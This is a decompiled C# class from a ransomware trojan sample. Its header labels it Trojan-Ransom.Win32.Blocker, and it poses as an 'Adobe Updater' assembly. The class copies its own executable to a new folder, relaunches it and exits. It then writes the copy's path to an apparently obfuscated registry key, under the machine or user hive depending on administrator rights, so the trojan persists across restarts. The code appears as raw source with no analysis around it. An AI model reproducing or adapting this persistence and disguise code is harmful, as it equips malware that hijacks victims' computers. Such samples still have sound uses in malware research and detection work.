// Decompiled with JetBrains decompiler
// Type: 
// Assembly: Adobe Updater, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: 4A16C989-2208-438C-922C-7B906D6E0A07
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00090-msil\Trojan-Ransom.Win32.Blocker.hdzy-869c557bf0abceed320b3ef24b39fc8b53bf66bc6b62a6576e9ddd1978225cc1.exe

using Microsoft.Win32;
using System;
using System.Diagnostics;
using System.IO;
using System.Security.Principal;

internal sealed class \u0006
{
  private string \u0002 = Process.GetCurrentProcess().MainModule.FileName;
  private string \u0003 = Path.Combine(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)), \u000E\u2001.\u0005\u2000 + \u000F\u2001.\u0002(1680134605) + \u000E\u2001.\u0008\u2000);

  public void \u0002()
  {
    this.\u0005();
    this.\u0003();
  }

  public void \u0003()
  {
    try
    {
      if (!Directory.Exists(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134615) + \u000E\u2001.\u0005\u2000))
        Directory.CreateDirectory(Environment.GetEnvironmentVariable(\u000F\u2001.\u0002(1680134597)) + \u000F\u2001.\u0002(1680134615) + \u000E\u2001.\u0005\u2000);
      if (File.Exists(this.\u0003))
        return;
      File.Copy(this.\u0002, this.\u0003, true);
      Process.Start(this.\u0003);
      Environment.Exit(0);
    }
    catch
    {
    }
  }

  public void \u0005()
  {
    try
    {
      if (\u0006.\u0002())
        Registry.LocalMachine.CreateSubKey(\u000F\u2001.\u0002(1680134575)).SetValue(\u000E\u2001.\u0006\u2000, (object) this.\u0003);
      else
        Registry.CurrentUser.CreateSubKey(\u000F\u2001.\u0002(1680134575)).SetValue(\u000E\u2001.\u0006\u2000, (object) this.\u0003);
    }
    catch
    {
    }
  }

  public static bool \u0002()
  {
    try
    {
      return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
    }
    catch (UnauthorizedAccessException ex)
    {
      return false;
    }
    catch (Exception ex)
    {
      return false;
    }
  }
}
